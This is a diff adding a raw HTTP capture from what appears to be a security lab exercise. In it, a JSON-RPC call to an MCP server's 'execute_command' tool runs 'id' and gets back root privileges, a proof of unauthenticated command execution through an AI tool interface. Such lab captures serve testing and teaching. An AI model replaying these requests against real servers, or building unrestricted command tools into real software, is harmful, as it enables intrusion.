@@ -1,0 +1,30 @@
+POST /api/labs/MCP_09/mcp/sse HTTP/1.1
+Host: localhost
+Content-Length: 118
+Content-Type: application/json
+Accept: text/event-stream
+Origin: http://localhost
+Referer: http://localhost/labs/MCP_09
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept-Language: zh-CN,zh;q=0.9
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{
+  "jsonrpc": "2.0",
+  "id": 7,
+  "method": "tools/call",
+  "params": {"name": "execute_command", "arguments": {"cmd": "id"}}
+}
+
+HTTP/1.1 200 OK
+Server: uvicorn
+Content-Type: text/event-stream; charset=utf-8
+access-control-allow-origin: http://localhost
+Connection: keep-alive
+
+event: message
+data: {"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"uid=0(root) gid=0(root) groups=0(root)"}],"isError":false}}
+
+event: done
+data: [DONE]
